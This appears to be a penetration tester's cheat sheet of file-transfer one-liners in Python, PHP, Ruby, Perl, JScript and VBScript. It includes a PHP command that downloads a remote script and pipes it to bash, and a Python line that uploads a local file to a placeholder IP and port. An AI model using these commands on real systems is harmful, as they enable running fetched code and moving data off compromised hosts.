# Python - Downloading
```JavaScript
python2.7 -c 'import urllib;urllib.urlretrieve ("<url>", "<outfile>")'
python3 -c 'import urllib.request;urllib.request.urlretrieve("<url>", "<outfile>")'
```
  
# PHP - Downloading
## File_get_contents()
```JavaScript
php -r '$file = file_get_contents("<url>"); file_put_contents("<outfile>",$file);'
```
## Fopen()
```JavaScript
php -r 'const BUFFER = 1024; $fremote = 
fopen("<url>", "rb"); $flocal = fopen("<outfile>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
  
## PHP Download and Pipe to Bash
```JavaScript
php -r '$lines = @file("<url>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
  
# Other Languages
## Ruby Download
```JavaScript
ruby -e 'require "net/http"; File.write("<outfile>", Net::HTTP.get(URI.parse("<url>")))'
```
  
## Perl Download
```JavaScript
perl -e 'use LWP::Simple; getstore("<url>", "<outfile>");'
```
  
  
  
# Javascript Download
- name the file wget.js and save the following content
```JavaScript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
  
## Download the File Using Javascript and cscript.exe
```JavaScript
cscript.exe /nologo wget.js <url> <outputfile>
```
  
  
  
# VBScript
- Microsoft Visual Basic Scripting Edition
- create wget.vbs and save the following content
```JavaScript
Code: vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```
  
## Download a File Using VBScript and cscript.exe
```JavaScript
cscript.exe /nologo wget.vbs <url> <outfile>
```
  
  
  
# Upload Operations with Python3
## Starting Python Upload Server
```JavaScript
python3 -m uploadserver
```
  
## Uploading a File Using Python One-liner
```JavaScript
python3 -c 'import requests;requests.post("http://<IP>:<port>/upload",files={"files":open("/path/to/file","rb")})'
```